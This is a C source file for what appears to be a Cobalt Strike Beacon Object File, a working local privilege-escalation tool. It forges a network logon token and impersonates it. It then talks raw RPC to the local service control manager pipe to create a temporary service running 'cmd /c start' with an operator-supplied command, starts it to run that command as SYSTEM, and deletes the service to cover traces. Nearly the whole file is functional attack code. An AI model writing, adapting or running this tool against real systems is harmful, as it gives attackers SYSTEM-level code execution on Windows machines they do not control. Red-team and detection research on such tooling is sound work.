#define SECURITY_WIN32
#include "Base.c"
#include "Rpc.c"
#include "Token.c"
#include "beacon.h"
#include "bofdefs.h"
#include <stdio.h>
#include <windows.h>

void go(char *args, int argc) {
    if (!bofstart()) return;

    datap Parser = {0};
    PSTR pstrCommand = {0};
    DWORD dwCommand = {0};
    BUFFER CurrentUser = {0};
    HANDLE hCurrentToken, hNetworkToken = NULL;
    PPRIVSLIST pPrivsList, pNetworkPrivsList = NULL;
    DWORD dwPrivsCount, dwNetworkPrivsCount = 0x00;

    BeaconDataParse(&Parser, args, argc);
    pstrCommand = BeaconDataExtract(&Parser, &dwCommand);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Command: %s\n", pstrCommand);

    /*     hCurrentToken = TokenCurrentHandle(); */
    /*     BeaconPrintf(CALLBACK_OUTPUT, "[+] Got Current Token: 0x%x\n", */
    /*                  hCurrentToken); */

    /*     if (!TokenQueryOwner(hCurrentToken, &CurrentUser, */
    /*                          TOKEN_OWNER_FLAG_DEFAULT)) { */
    /*         BeaconPrintf(CALLBACK_ERROR, "[-] Can't Query Token User Owner
     * !\n"); */
    /*         return; */
    /*     } */

    /*     BeaconPrintf(CALLBACK_OUTPUT, "[+] Current User: %ls\n", */
    /*                  CurrentUser.Buffer); */
    /*     if (!TokenQueryPrivs(hCurrentToken, &pPrivsList, &dwPrivsCount)) { */
    /*         BeaconPrintf(CALLBACK_ERROR, */
    /*                      "[-] Can't Query Token User Privileges !\n"); */
    /*         return; */
    /*     } */

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Trying get Network Token\n");
    hNetworkToken = ForgeNetworkAuthToken();

    if (hNetworkToken == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Can't Get Network Token !\n");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Got Network Token: 0x%x\n",
                 hNetworkToken);

    /* if (!TokenQueryPrivs(hNetworkToken, &pNetworkPrivsList, */
    /*                      &dwNetworkPrivsCount)) { */
    /*     BeaconPrintf(CALLBACK_ERROR, */
    /*                  "[-] Can't Query Netwok Token Privileges !\n"); */
    /*     return; */
    /* } */

    ADVAPI32$ImpersonateLoggedOnUser(hNetworkToken);

    /* Run RPC Command */

    RpcConnectionStruct *RpcConnection =
        (RpcConnectionStruct *)MSVCRT$malloc(sizeof(RpcConnectionStruct));
    BYTE bServiceManagerObject[20];
    BYTE bServiceObject[20];
    DWORD dwReturnValue = 0;
    char szServiceName[256];
    DWORD dwServiceNameLength = 0;
    char szServiceCommandLine[256];
    DWORD dwServiceCommandLineLength = 0;

    // generate a temporary service name
    MSVCRT$memset(szServiceName, 0, sizeof(szServiceName));
    MSVCRT$_snprintf(szServiceName, sizeof(szServiceName) - 1,
                     "CreateSvcRpc_%u", KERNEL32$GetTickCount());
    dwServiceNameLength = MSVCRT$strlen(szServiceName) + 1;

    // set service command line
    MSVCRT$memset(szServiceCommandLine, 0, sizeof(szServiceCommandLine));
    MSVCRT$_snprintf(szServiceCommandLine, sizeof(szServiceCommandLine) - 1,
                     "cmd /c start %s", pstrCommand);
    dwServiceCommandLineLength = MSVCRT$strlen(szServiceCommandLine) + 1;
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Connecting to SVCCTL RPC pipe...\n");

    // Connect RPC
    char *szPipePath = "\\\\127.0.0.1\\pipe\\ntsvcs";
    char *pInterfaceUUID = "367abb81-9844-35f1-ad32-98f038001003";
    DWORD dwInterfaceVersion = 2;
    HANDLE hFile = NULL;

    hFile = KERNEL32$CreateFileA(szPipePath, GENERIC_READ | GENERIC_WRITE, 0,
                                 NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "Can't Create File!\n");
        return;
    }

    MSVCRT$memset((void *)RpcConnection, 0, sizeof(RpcConnectionStruct));
    RpcConnection->hFile = hFile;
    RpcConnection->dwCallIndex = 1;
    if (RpcBind(RpcConnection, pInterfaceUUID, 2) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "can't RPC Bind!\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Opening service manager...\n");

    // OpenSCManager
    RpcInitialiseRequestData(RpcConnection);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, SC_MANAGER_ALL_ACCESS);
    if (RpcSendRequest(RpcConnection, RPC_CMD_ID_OPEN_SC_MANAGER) != 0) {
        // error
        RpcDisconnect(RpcConnection);
        MSVCRT$free(RpcConnection);
        BeaconPrintf(CALLBACK_ERROR, "Send Return Error!\n");
        return;
    }

    // validate rpc output data length
    if (RpcConnection->dwProcedureOutputDataLength !=
        RPC_OUTPUT_LENGTH_OPEN_SC_MANAGER) {
        // error
        RpcDisconnect(RpcConnection);
        MSVCRT$free(RpcConnection);
        BeaconPrintf(CALLBACK_ERROR, "Validate Rpc output Return Error!\n");
        return;
    }

    // get return value
    dwReturnValue = (DWORD)RpcConnection->bProcedureOutputData[20];

    // check return value
    if (dwReturnValue != 0) {
        BeaconPrintf(CALLBACK_ERROR, "Check Return Error!\n");
        RpcDisconnect(RpcConnection);
        MSVCRT$free(RpcConnection);
        return;
    }

    // store service manager object
    MSVCRT$memcpy(bServiceManagerObject, RpcConnection->bProcedureOutputData,
                  sizeof(bServiceManagerObject));

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Creating temporary service...\n");

    /* /1* // CreateService *1/ */
    RpcInitialiseRequestData(RpcConnection);
    RpcAppendRequestData_Binary(RpcConnection, bServiceManagerObject,
                                sizeof(bServiceManagerObject));
    RpcAppendRequestData_Dword(RpcConnection, dwServiceNameLength);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, dwServiceNameLength);
    RpcAppendRequestData_Binary(RpcConnection, (BYTE *)szServiceName,
                                dwServiceNameLength);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, SERVICE_ALL_ACCESS);
    RpcAppendRequestData_Dword(RpcConnection, SERVICE_WIN32_OWN_PROCESS);
    RpcAppendRequestData_Dword(RpcConnection, SERVICE_DEMAND_START);
    RpcAppendRequestData_Dword(RpcConnection, SERVICE_ERROR_IGNORE);
    RpcAppendRequestData_Dword(RpcConnection, dwServiceCommandLineLength);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, dwServiceCommandLineLength);
    RpcAppendRequestData_Binary(RpcConnection, (BYTE *)szServiceCommandLine,
                                dwServiceCommandLineLength);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    if (RpcSendRequest(RpcConnection, RPC_CMD_ID_CREATE_SERVICE) != 0) {
        // error
        RpcDisconnect(RpcConnection);
        MSVCRT$free(RpcConnection);
        BeaconPrintf(CALLBACK_ERROR, "Rpc Send error");
        return;
    }

    // validate rpc output data length
    if (RpcConnection->dwProcedureOutputDataLength !=
        RPC_OUTPUT_LENGTH_CREATE_SERVICE) {
        // error
        RpcDisconnect(RpcConnection);
        MSVCRT$free(RpcConnection);
        BeaconPrintf(CALLBACK_ERROR, "validate RPC output error");
        return;
    }

    // get return value
    dwReturnValue = (DWORD)RpcConnection->bProcedureOutputData[24];

    // check return value
    if (dwReturnValue != 0) {
        BeaconPrintf(CALLBACK_ERROR, "CreateService error: %u\n",
                     dwReturnValue);

        // error
        RpcDisconnect(RpcConnection);
        MSVCRT$free(RpcConnection);
        return;
    }

    // store service object
    MSVCRT$memcpy(bServiceObject, &(RpcConnection->bProcedureOutputData[4]),
                  sizeof(bServiceObject));
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Execute '%s' as SYSTEM user...\n",
                 pstrCommand);

    // StartService
    RpcInitialiseRequestData(RpcConnection);
    RpcAppendRequestData_Binary(RpcConnection, bServiceObject,
                                sizeof(bServiceObject));
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    if (RpcSendRequest(RpcConnection, RPC_CMD_ID_START_SERVICE) != 0) {
        // error
        RpcDisconnect(RpcConnection);
        MSVCRT$free(RpcConnection);
        BeaconPrintf(CALLBACK_ERROR, "Send Request error");
        return;
    }

    // validate rpc output data length
    if (RpcConnection->dwProcedureOutputDataLength !=
        RPC_OUTPUT_LENGTH_START_SERVICE) {
        // error
        RpcDisconnect(RpcConnection);
        MSVCRT$free(RpcConnection);
        BeaconPrintf(CALLBACK_ERROR, "Validate error");
        return;
    }

    // get return value
    dwReturnValue = (DWORD)RpcConnection->bProcedureOutputData[0];

    // check return value
    if (dwReturnValue != 0 && dwReturnValue != ERROR_SERVICE_REQUEST_TIMEOUT) {
        /* BeaconPrintf(CALLBACK_ERROR,"Check Return Value error"); */
        /* // error */
        /* RpcDisconnect(RpcConnection); */
        /* return; */
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Deleting temporary service...\n");

    // DeleteService
    RpcInitialiseRequestData(RpcConnection);
    RpcAppendRequestData_Binary(RpcConnection, bServiceObject,
                                sizeof(bServiceObject));
    if (RpcSendRequest(RpcConnection, RPC_CMD_ID_DELETE_SERVICE) != 0) {
        // error
        RpcDisconnect(RpcConnection);
        BeaconPrintf(CALLBACK_ERROR, "DeleteService Error!\n");
        MSVCRT$free(RpcConnection);
        return;
    }

    // validate rpc output data length
    if (RpcConnection->dwProcedureOutputDataLength !=
        RPC_OUTPUT_LENGTH_DELETE_SERVICE) {
        // error
        RpcDisconnect(RpcConnection);
        MSVCRT$free(RpcConnection);
        return;
    }

    // get return value
    dwReturnValue = (DWORD)RpcConnection->bProcedureOutputData[0];

    // check return value
    if (dwReturnValue != 0) {
        BeaconPrintf(CALLBACK_ERROR, "Validate Rpc Output Data Error!\n");

        RpcDisconnect(RpcConnection);
        MSVCRT$free(RpcConnection);

        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Finished\n");

    // disconnect from rpc pipe
    if (RpcDisconnect(RpcConnection) != 0) {

        MSVCRT$free(RpcConnection);
        return;
    }

    MSVCRT$free(RpcConnection);

    ADVAPI32$RevertToSelf();
    KERNEL32$CloseHandle(hNetworkToken);
    return;
}
